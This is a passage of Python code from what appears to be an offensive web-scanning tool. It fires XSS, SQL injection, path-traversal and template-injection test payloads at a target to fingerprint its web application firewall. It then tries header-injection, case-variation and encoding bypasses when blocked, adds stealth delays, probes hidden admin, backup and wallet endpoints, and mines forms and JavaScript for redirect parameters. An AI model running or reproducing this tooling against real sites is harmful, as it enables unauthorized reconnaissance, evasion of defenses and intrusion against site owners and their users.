    async def detect_waf_and_defenses(self, url: str) -> Dict[str, any]:
        """Complete WAF and defense detection system"""
        print("\\nüõ°Ô∏è  [PHASE-1] COMPLETE DEFENSE ANALYSIS")
        print("‚ñà" * 60)
        
        waf_info = {
            'detected': False,
            'type': 'unknown',
            'bypass_methods': [],
            'rate_limit': False,
            'load_balancer': False
        }
        
        try:
            # Multiple test payloads for comprehensive detection
            test_payloads = [
                '<script>alert(1)</script>',
                'UNION SELECT 1,2,3--',
                '../../../etc/passwd',
                'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
                '${7*7}',
                '{{7*7}}'
            ]
            
            for i, payload in enumerate(test_payloads, 1):
                test_url = f"{url}?waf_test={quote(payload)}"
                print(f"\\r[WAF-TEST] Testing defense system {i}/{len(test_payloads)}...", end='')
                
                async with self.session.get(test_url, allow_redirects=False) as response:
                    headers = dict(response.headers)
                    content = await response.text()
                    
                    # CloudFlare detection
                    cf_headers = ['cf-ray', 'cf-cache-status', 'cf-request-id']
                    if any(h.lower() in cf_headers for h in headers.keys()):
                        waf_info.update({
                            'detected': True,
                            'type': 'cloudflare',
                            'bypass_methods': ['header_injection', 'case_variation', 'encoding_bypass', 'fragment_bypass']
                        })
                        print(f"\\n[WAF-DETECTED] CloudFlare WAF identified")
                        break
                    
                    # Sucuri detection
                    elif any(h.lower().startswith('x-sucuri') for h in headers.keys()):
                        waf_info.update({
                            'detected': True,
                            'type': 'sucuri',
                            'bypass_methods': ['ip_spoofing', 'user_agent_rotation', 'request_splitting']
                        })
                        print(f"\\n[WAF-DETECTED] Sucuri WAF identified")
                        break
                    
                    # AWS WAF detection
                    elif response.status in [403, 406] and any(aws_indicator in content.lower() for aws_indicator in ['blocked', 'forbidden', 'aws']):
                        waf_info.update({
                            'detected': True,
                            'type': 'aws_waf',
                            'bypass_methods': ['header_injection', 'request_splitting', 'encoding_bypass']
                        })
                        print(f"\\n[WAF-DETECTED] AWS WAF identified")
                        break
                    
                    # Incapsula detection
                    elif any(h.lower().startswith('x-iinfo') for h in headers.keys()):
                        waf_info.update({
                            'detected': True,
                            'type': 'incapsula',
                            'bypass_methods': ['header_injection', 'case_variation']
                        })
                        print(f"\\n[WAF-DETECTED] Incapsula WAF identified")
                        break
                    
                    # Load balancer detection
                    lb_headers = ['x-forwarded-for', 'x-real-ip', 'x-forwarded-proto', 'x-forwarded-host']
                    if any(h.lower() in lb_headers for h in headers.keys()):
                        waf_info['load_balancer'] = True
                        print(f"\\n[LB-DETECTED] Load balancer detected")
                
                await asyncio.sleep(0.2)
            
            if not waf_info['detected']:
                print(f"\\n[WAF-STATUS] No WAF detected - direct access possible")
                print("[SECURITY] Target appears to have minimal protection")
        
        except Exception as e:
            print(f"\\n[WAF-ERROR] Detection failed: {e}")
        
        return waf_info
    
    async def quantum_reconnaissance(self, waf_info: Dict[str, any]) -> Set[str]:
        """Complete quantum reconnaissance engine"""
        print("\\nüîç [PHASE-2] QUANTUM RECONNAISSANCE ENGINE")
        print("‚ñà" * 60)
        
        urls_to_crawl = {self.target_url}
        crawled_urls = set()
        depth = 0
        
        # Enhanced crawling with WAF evasion
        while urls_to_crawl and depth < self.max_depth and len(crawled_urls) < self.max_pages:
            current_urls = list(urls_to_crawl)[:30]  # Increased batch size
            urls_to_crawl.clear()
            
            print(f"[RECON] Scanning depth {depth + 1} - {len(current_urls)} URLs...")
            
            # Parallel crawling with advanced error handling
            tasks = []
            for url in current_urls:
                if url not in crawled_urls:
                    tasks.append(self.advanced_crawl_page(url, waf_info))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        self.logger.debug(f"[CRAWL-EXCEPTION] {result}")
                        continue
                    
                    if result:
                        url, new_urls, params = result
                        crawled_urls.add(url)
                        self.parameters.extend(params)
                        
                        # Enhanced URL filtering and addition
                        for new_url in new_urls:
                            if (self.is_same_domain(new_url) and 
                                new_url not in crawled_urls and
                                not self.should_skip_url(new_url)):
                                urls_to_crawl.add(new_url)
            
            depth += 1
            print(f"[RECON] Depth {depth}: {len(crawled_urls)} URLs, {len(self.parameters)} parameters")
            
            # Stealth delay between depths
            await asyncio.sleep(random.uniform(0.5, 1.5))
        
        # Phase 2.5: Hidden endpoint discovery
        print("[RECON] Discovering hidden endpoints...")
        hidden_urls = await self.discover_hidden_endpoints()
        crawled_urls.update(hidden_urls)
        
        self.discovered_urls = crawled_urls
        print(f"[RECON-COMPLETE] Total discovery: {len(crawled_urls)} URLs, {len(self.parameters)} parameters")
        return crawled_urls
    
    async def advanced_crawl_page(self, url: str, waf_info: Dict[str, any]) -> Optional[Tuple[str, Set[str], List[Parameter]]]:
        """Advanced page crawling with WAF bypass"""
        try:
            # Try normal request first
            async with self.session.get(url, allow_redirects=False) as response:
                if response.status in [403, 406] and waf_info['detected']:
                    # WAF blocking detected, try bypass
                    content = await self.bypass_waf_request(url, waf_info)
                    if not content:
                        return None
                else:
                    content = await response.text()
                    headers = dict(response.headers)
                
                # Comprehensive parameter extraction
                if BS4_OK:
                    soup = BeautifulSoup(content, 'html.parser')
                    new_urls = self.extract_urls_advanced(soup, url)
                    params = self.extract_form_params_advanced(soup, url)
                    
                    # Extract additional parameters from meta tags
                    params.extend(self.extract_meta_parameters(soup, url))
                    
                    # Extract parameters from data attributes
                    params.extend(self.extract_data_attributes(soup, url))
                else:
                    new_urls = self.extract_urls_regex(content, url)
                    params = self.extract_form_params_regex(content, url)
                
                # Extract URL parameters
                params.extend(self.extract_url_parameters(url))
                
                # Extract header parameters
                if 'headers' in locals():
                    params.extend(self.extract_header_parameters(headers, url))
                
                # Complete JavaScript analysis
                js_params = await self.complete_javascript_analysis(content, url)
                params.extend(js_params)
                
                # Complete Web3 analysis
                web3_params = await self.complete_web3_analysis(content, url)
                params.extend(web3_params)
                
                return url, new_urls, params
                
        except Exception as e:
            self.logger.debug(f"[CRAWL-ERROR] {url}: {e}")
            return None
    
    async def bypass_waf_request(self, url: str, waf_info: Dict[str, any]) -> Optional[str]:
        """Advanced WAF bypass techniques"""
        bypass_methods = waf_info.get('bypass_methods', [])
        
        for method in bypass_methods:
            try:
                if method == 'header_injection':
                    # Try multiple bypass headers
                    for bypass_header in self.waf_bypass_headers:
                        headers = {**self.session._default_headers, **bypass_header}
                        async with self.session.get(url, headers=headers, allow_redirects=False) as response:
                            if response.status not in [403, 406]:
                                print(f"\\n[WAF-BYPASS] Success with header injection: {list(bypass_header.keys())[0]}")
                                return await response.text()
                
                elif method == 'case_variation':
                    # Vary URL case
                    varied_url = self.vary_url_case(url)
                    async with self.session.get(varied_url, allow_redirects=False) as response:
                        if response.status not in [403, 406]:
                            print(f"\\n[WAF-BYPASS] Success with case variation")
                            return await response.text()
                
                elif method == 'encoding_bypass':
                    # Try different encodings
                    encoded_url = self.encode_url_for_bypass(url)
                    async with self.session.get(encoded_url, allow_redirects=False) as response:
                        if response.status not in [403, 406]:
                            print(f"\\n[WAF-BYPASS] Success with encoding bypass")
                            return await response.text()
                
                await asyncio.sleep(0.5)  # Delay between bypass attempts
                
            except Exception as e:
                continue
        
        print(f"\\n[WAF-BYPASS] All bypass methods failed")
        return None
    
    def vary_url_case(self, url: str) -> str:
        """Vary URL case for WAF bypass"""
        parsed = urlparse(url)
        path = parsed.path
        
        # Randomly vary case
        varied_path = ""
        for char in path:
            if char.isalpha():
                varied_path += char.upper() if random.choice([True, False]) else char.lower()
            else:
                varied_path += char
        
        return f"{parsed.scheme}://{parsed.netloc}{varied_path}?{parsed.query}"
    
    def encode_url_for_bypass(self, url: str) -> str:
        """Encode URL for WAF bypass"""
        parsed = urlparse(url)
        
        # Double encode some characters
        path = parsed.path
        encoded_path = path.replace('/', '%2f').replace('.', '%2e')
        
        return f"{parsed.scheme}://{parsed.netloc}{encoded_path}?{parsed.query}"
    
    def should_skip_url(self, url: str) -> bool:
        """Intelligent URL filtering"""
        skip_extensions = [
            '.jpg', '.jpeg', '.png', '.gif', '.svg', '.ico', '.css',
            '.pdf', '.zip', '.tar', '.gz', '.mp4', '.avi', '.mov',
            '.woff', '.woff2', '.ttf', '.eot', '.mp3', '.wav'
        ]
        
        parsed = urlparse(url)
        path_lower = parsed.path.lower()
        
        # Skip static files
        if any(path_lower.endswith(ext) for ext in skip_extensions):
            return True
        
        # Skip dangerous URLs
        danger_keywords = ['logout', 'signout', 'delete', 'remove', 'destroy', 'reset', 'clear']
        if any(keyword in url.lower() for keyword in danger_keywords):
            return True
        
        return False
    
    async def discover_hidden_endpoints(self) -> Set[str]:
        """Discover hidden endpoints using advanced techniques"""
        hidden_urls = set()
        
        # Comprehensive hidden endpoint patterns
        hidden_patterns = [
            # Admin endpoints
            '/admin', '/administrator', '/panel', '/dashboard', '/control',
            '/manage', '/management', '/backend', '/cp',
            
            # API endpoints
            '/api', '/api/v1', '/api/v2', '/api/v3', '/rest', '/graphql',
            '/api/redirect', '/api/auth', '/api/callback', '/api/oauth',
            
            # Development endpoints
            '/dev', '/test', '/debug', '/staging', '/beta', '/alpha',
            '/development', '/testing', '/qa',
            
            # Configuration endpoints
            '/config', '/configuration', '/settings', '/setup',
            '/install', '/installation',
            
            # Backup and temporary endpoints
            '/backup', '/backups', '/old', '/new', '/temp', '/tmp',
            '/archive', '/bak', '/backup.sql',
            
            # Authentication endpoints
            '/auth', '/oauth', '/login', '/signin', '/sso', '/saml',
            '/callback', '/redirect', '/return',
            
            # Web3 specific endpoints
            '/wallet', '/connect', '/dapp', '/defi', '/nft',
            '/wallet/connect', '/wallet/callback', '/dapp/redirect',
            '/defi/redirect', '/nft/redirect', '/swap/callback',
            
            # Webhook endpoints
            '/webhook', '/webhooks', '/hook', '/hooks', '/notify',
            '/notification', '/callback'
        ]
        
        base_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}"
        
        print(f"[HIDDEN-DISCOVERY] Testing {len(hidden_patterns)} hidden endpoints...")
        
        for i, pattern in enumerate(hidden_patterns, 1):
            if i % 10 == 0:
                print(f"\\r[HIDDEN-DISCOVERY] Progress: {i}/{len(hidden_patterns)}", end='')
            
            test_url = f"{base_url}{pattern}"
            try:
                async with self.session.get(test_url, allow_redirects=False) as response:
                    # Interesting response codes
                    if response.status in [200, 201, 301, 302, 303, 307, 308, 401, 403]:
                        hidden_urls.add(test_url)
                        print(f"\\n[HIDDEN-FOUND] {pattern} -> {response.status}")
            except:
                continue
            
            await asyncio.sleep(0.1)  # Rate limiting
        
        print(f"\\n[HIDDEN-COMPLETE] Found {len(hidden_urls)} hidden endpoints")
        return hidden_urls
    
    def extract_urls_advanced(self, soup, base_url: str) -> Set[str]:
        """Advanced URL extraction from HTML"""
        urls = set()
        
        # Extract from various HTML elements
        url_elements = [
            ('a', 'href'), ('link', 'href'), ('form', 'action'),
            ('iframe', 'src'), ('frame', 'src'), ('embed', 'src'),
            ('object', 'data'), ('source', 'src')
        ]
        
        for tag, attr in url_elements:
            for element in soup.find_all(tag):
                url_value = element.get(attr)
                if url_value:
                    full_url = urljoin(base_url, url_value)
                    if self.is_same_domain(full_url):
                        urls.add(full_url)
        
        return urls
    
    def extract_urls_regex(self, content: str, base_url: str) -> Set[str]:
        """Extract URLs using comprehensive regex patterns"""
        urls = set()
        
        url_patterns = [
            r'href=["\']([^"\']+)["\']',
            r'src=["\']([^"\']+)["\']',
            r'action=["\']([^"\']+)["\']',
            r'data=["\']([^"\']+)["\']',
            r'url\(["\']([^"\']+)["\']',
            r'@import\s+["\']([^"\']+)["\']'
        ]
        
        for pattern in url_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(base_url, match)
                if self.is_same_domain(full_url):
                    urls.add(full_url)
        
        return urls
    
    def extract_form_params_advanced(self, soup, url: str) -> List[Parameter]:
        """Advanced form parameter extraction"""
        params = []
        
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            form_url = urljoin(url, action) if action else url
            
            # Extract from all form elements
            form_elements = ['input', 'select', 'textarea', 'button']
            
            for element_type in form_elements:
                for element in form.find_all(element_type):
                    name = element.get('name')
                    value = element.get('value', '')
                    input_type = element.get('type', 'text')
                    
                    if name:
                        is_redirect = self.is_redirect_parameter(name, value)
                        confidence = self.calculate_confidence(name, value, 'form')
                        
                        # Boost confidence for hidden inputs with redirect values
                        if input_type == 'hidden' and is_redirect:
                            confidence += 0.2
                        
                        # Boost for action URLs
                        if action and self.is_redirect_parameter('action', action):
                            confidence += 0.1
                        
                        params.append(Parameter(
                            name=name,
                            value=value,
                            source='form',
                            context='form_input',
                            url=form_url,
                            method=method,
                            is_redirect_related=is_redirect,
                            confidence=min(confidence, 1.0)
                        ))
        
        return params
    
    def extract_form_params_regex(self, content: str, url: str) -> List[Parameter]:
        """Extract form parameters using comprehensive regex"""
        params = []
        
        # Enhanced form element patterns
        form_patterns = [
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?[^>]*>',
            r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>',
            r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
            r'<button[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?[^>]*>'
        ]
        
        for pattern in form_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    name = match[0]
                    value = match[1] if len(match) > 1 else ''
                else:
                    name = match
                    value = ''
                
                is_redirect = self.is_redirect_parameter(name, value)
                confidence = self.calculate_confidence(name, value, 'form')
                
                params.append(Parameter(
                    name=name,
                    value=value,
                    source='form',
                    context='form_input',
                    url=url,
                    is_redirect_related=is_redirect,
                    confidence=confidence
                ))
        
        return params
    
    def extract_url_parameters(self, url: str) -> List[Parameter]:
        """Complete URL parameter extraction"""
        params = []
        parsed = urlparse(url)
        
        # Query parameters
        if parsed.query:
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            for param_name, param_values in query_params.items():
                for value in param_values:
                    is_redirect = self.is_redirect_parameter(param_name, value)
                    confidence = self.calculate_confidence(param_name, value, 'query')
                    
                    params.append(Parameter(
                        name=param_name,
                        value=value,
                        source='url',
                        context='query',
                        url=url,
                        is_redirect_related=is_redirect,
                        confidence=confidence
                    ))
        
        # Fragment parameters
        if parsed.fragment:
            if '=' in parsed.fragment:
                # Parse fragment as query string
                fragment_params = parse_qs(parsed.fragment, keep_blank_values=True)
                for param_name, param_values in fragment_params.items():
                    for value in param_values:
                        is_redirect = self.is_redirect_parameter(param_name, value)
                        confidence = self.calculate_confidence(param_name, value, 'fragment')
                        
                        params.append(Parameter(
                            name=param_name,
                            value=value,
                            source='url',
                            context='fragment',
                            url=url,
                            is_redirect_related=is_redirect,
                            confidence=confidence
                        ))
            else:
                # Simple fragment
                params.append(Parameter(
                    name='fragment',
                    value=parsed.fragment,
                    source='url',
                    context='fragment',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.7
                ))
        
        return params
    
    def extract_header_parameters(self, headers: Dict[str, str], url: str) -> List[Parameter]:
        """Extract parameters from HTTP headers"""
        params = []
        
        redirect_headers = [
            'Location', 'Refresh', 'Link', 'Content-Location', 
            'X-Redirect-To', 'X-Forwarded-For', 'X-Real-IP',
            'X-Original-URL', 'X-Rewrite-URL'
        ]
        
        for header_name, header_value in headers.items():
            if (header_name in redirect_headers or 
                'redirect' in header_name.lower() or
                'location' in header_name.lower() or
                'forward' in header_name.lower()):
                
                params.append(Parameter(
                    name=header_name.lower().replace('-', '_'),
                    value=header_value,
                    source='headers',
                    context='http_header',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.95
                ))
        
        return params
    
    def extract_meta_parameters(self, soup, url: str) -> List[Parameter]:
        """Extract parameters from meta tags"""
        params = []
        
        for meta in soup.find_all('meta'):
            content = meta.get('content', '')
            name = meta.get('name', meta.get('property', ''))
            http_equiv = meta.get('http-equiv', '')
            
            # Check meta refresh
            if http_equiv and 'refresh' in http_equiv.lower():
                params.append(Parameter(
                    name='meta_refresh',
                    value=content,
                    source='meta',
                    context='meta_tag',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.9
                ))
            
            # Check content for URLs
            elif content and (content.startswith(('http', '//')) or 'url=' in content.lower()):
                params.append(Parameter(
                    name=f"meta_{name}" if name else "meta_content",
                    value=content,
                    source='meta',
                    context='meta_tag',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.8
                ))
        
        return params
    
    def extract_data_attributes(self, soup, url: str) -> List[Parameter]:
        """Extract parameters from HTML5 data attributes"""
        params = []
        
        for element in soup.find_all(attrs=lambda x: x and any(key.startswith('data-') for key in x.keys())):
            for attr_name, attr_value in element.attrs.items():
                if attr_name.startswith('data-') and attr_value:
                    is_redirect = self.is_redirect_parameter(attr_name, attr_value)
                    confidence = self.calculate_confidence(attr_name, attr_value, 'data_attribute')
                    
                    if is_redirect or confidence > 0.5:
                        params.append(Parameter(
                            name=attr_name,
                            value=attr_value,
                            source='data_attribute',
                            context='html_data',
                            url=url,
                            is_redirect_related=is_redirect,
                            confidence=confidence
                        ))
        
        return params
    
    async def complete_javascript_analysis(self, content: str, url: str) -> List[Parameter]:
        """Complete JavaScript analysis with all patterns"""
        params = []
        
        # Extract all JavaScript blocks
        js_blocks = []
        
        # Enhanced script extraction
        script_patterns = [
            r'<script[^>]*>(.*?)</script>',
            r'on\w+=["\']([^"\']+)["\']',  # Event handlers
            r'javascript:([^"\';\s]+)',    # JavaScript protocols
            r'data:text/javascript,([^"\']+)'  # Data URLs
        ]
        
        for pattern in script_patterns:
            matches = re.findall(pattern, content, re.DOTALL | re.IGNORECASE)
            if matches:
                js_blocks.extend(matches)
        
        # External JavaScript files with comprehensive discovery
        src_patterns = [
            r'<script[^>]*src=["\']([^"\']+)["\']',
            r'import\s+.*from\s+["\']([^"\']+)["\']',
            r'require\(["\']([^"\']+)["\']',
            r'importScripts\(["\']([^"\']+)["\']'
        ]
        
        for pattern in src_patterns:
            src_matches = re.findall(pattern, content, re.IGNORECASE)
            for src in src_matches:
                js_url = urljoin(url, src)
                if self.is_same_domain(js_url) or any(ext in js_url for ext in ['.js', '.ts', '.jsx', '.tsx']):
                    self.js_files.add(js_url)
                    js_content = await self.fetch_javascript_file(js_url)
                    if js_content:
                        js_blocks.append(js_content)
        
        # Complete JavaScript analysis
        for js_content in js_blocks:
            js_params = self.analyze_javascript_comprehensively(js_content, url)
            params.extend(js_params)
        
        return params
    
    async def fetch_javascript_file(self, js_url: str) -> Optional[str]:
        """Fetch JavaScript file with retry logic"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                async with self.session.get(js_url) as response:
                    if response.status == 200:
                        return await response.text()
            except Exception as e:
                if attempt == max_retries - 1:
                    self.logger.debug(f"[JS-FETCH-ERROR] {js_url}: {e}")
                await asyncio.sleep(0.5)
        
        return None
    
    def analyze_javascript_comprehensively(self, js_content: str, source_url: str) -> List[Parameter]:
        """Comprehensive JavaScript analysis with all patterns"""
        params = []
        
        # Complete JavaScript patterns for parameter extraction
        ultimate_js_patterns = [
            # Direct redirect patterns (highest priority)
            r'location\.href\s*=\s*([^;]+)',
            r'window\.location\s*=\s*([^;]+)',
            r'document\.location\s*=\s*([^;]+)',
            r'location\.assign\(["\']?([^"\';\)]+)',
            r'location\.replace\(["\']?([^"\';\)]+)',
            r'window\.open\(["\']?([^"\';\,\)]+)',
            r'history\.pushState\([^,]*,\s*[^,]*,\s*["\']?([^"\';\)]+)',
            r'history\.replaceState\([^,]*,\s*[^,]*,\s*["\']?([^"\';\)]+)',
            
            # Parameter extraction patterns
            r'new\s+URLSearchParams\([^)]*\)\.get\(["\']([^"\']+)["\']',
            r'new\s+URL\([^)]*\)\.searchParams\.get\(["\']([^"\']+)["\']',
            r'location\.search\.match\(/[\?\&]([^=&]+)=/\)',
            r'location\.hash\.match\(/#([^=&]+)=/\)',
            r'getParameter\(["\']([^"\']+)["\']',
            r'getUrlParameter\(["\']([^"\']+)["\']',
            
            # Storage patterns
            r'localStorage\.getItem\(["\']([^"\']+)["\']',
            r'sessionStorage\.getItem\(["\']([^"\']+)["\']',
            r'localStorage\.setItem\(["\']([^"\']+)["\'],\s*["\']?([^"\';\)]*)',
            r'sessionStorage\.setItem\(["\']([^"\']+)["\'],\s*["\']?([^"\';\)]*)',
            r'cookie\.get\(["\']([^"\']+)["\']',
            r'document\.cookie\.match\(/([^=]+)=/\)',
            
            # Variable assignments with URLs or redirect-related values
            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*(?:https?://|//|\.com|\.org|redirect|url)[^"\']*)["\']',
            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*([^;]*(?:location|redirect|url|href)[^;]*)',
            
            # Function parameters and calls
            r'function\s+(\w+)\s*\(\s*([^)]*)\s*\)',
            r'(\w+)\s*=\s*function\s*\(\s*([^)]*)\s*\)',
            r'=>\s*\(\s*([^)]*)\s*\)',
            
            # Object properties
            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*:\s*["\']([^"\']*)["\']',
            r'\.([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']',
            
            # Event listeners and handlers
            r'addEventListener\(["\']([^"\']+)["\'],\s*([^)]+)\)',
            r'on([a-zA-Z]+)\s*=\s*["\']?([^"\';\)]+)',
            
            # AJAX and fetch patterns
            r'fetch\(["\']?([^"\';\)]+)',
            r'axios\.([a-z]+)\(["\']?([^"\';\)]+)',
            r'jQuery\.([a-z]+)\(["\']?([^"\';\)]+)',
            r'\$\.([a-z]+)\(["\']?([^"\';\)]+)',
            r'XMLHttpRequest\(["\']?([^"\';\)]+)',
            
            # Web3 specific patterns
            r'connectWallet\(["\']?([^"\';\)]+)',
            r'walletConnect\(["\']?([^"\';\)]+)',
            r'ethereum\.request\([^)]*["\']([^"\']+)["\']',
            r'web3\.eth\.([^(]+)\(["\']?([^"\';\)]+)',
            r'provider\.send\([^)]*["\']([^"\']+)["\']',
            r'signer\.([^(]+)\(["\']?([^"\';\)]+)',
            r'contract\.methods\.([^(]+)\(["\']?([^"\';\)]+)',
            
            # Framework-specific patterns
            r'router\.push\(["\']?([^"\';\)]+)',
            r'navigate\(["\']?([^"\';\)]+)',
            r'redirect\(["\']?([^"\';\)]+)',
            r'window\.location\.href\s*=\s*([^;]+)',
            r'top\.location\s*=\s*([^;]+)',
            r'parent\.location\s*=\s*([^;]+)'
        ]
        
        lines = js_content.split('\n')
        for line_num, line in enumerate(lines, 1):
            for pattern in ultimate_js_patterns:
                matches = re.finditer(pattern, line, re.IGNORECASE)
                for match in matches:
                    groups = match.groups()
                    if groups:
                        # Extract parameter name and value
                        if len(groups) == 1:
                            param_name = f"js_param_{line_num}_{match.start()}"
                            param_value = groups[0].strip('"\'')
                        elif len(groups) == 2:
                            param_name = groups[0].strip('"\'') if groups[0] else f"js_param_{line_num}"
                            param_value = groups[1].strip('"\'') if groups[1] else groups[0].strip('"\'')